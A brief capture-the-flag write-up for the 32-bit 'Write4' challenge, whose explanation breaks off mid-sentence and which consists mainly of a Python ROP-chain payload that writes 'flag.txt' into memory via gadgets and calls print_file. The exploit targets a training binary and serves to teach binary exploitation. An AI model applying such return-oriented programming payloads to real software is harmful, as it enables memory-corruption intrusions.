This is a Quick Writeup on **Write4** challenge

## For 32 bit

On small reversing , we see **print_file** function which will




final Exploit looks like this
```python
printf = p32(0x080483D0)
# 0x08048543 : mov dword ptr [edi], ebp ; ret
mov = p32(0x08048543)
# 0x080485aa : pop edi ; pop ebp ; ret
popop = p32(0x080485aa)
write1 = p32(0x804a0c0)
write2 = p32(0x804a0c4)

payload = flat(
    b"a"*44,
    popop,
    write1,
    b'flag',
    mov,
    popop,
    write2,
    b'.txt',
    mov,     
    printf,
    b"xxxx",
    write1  
)
```















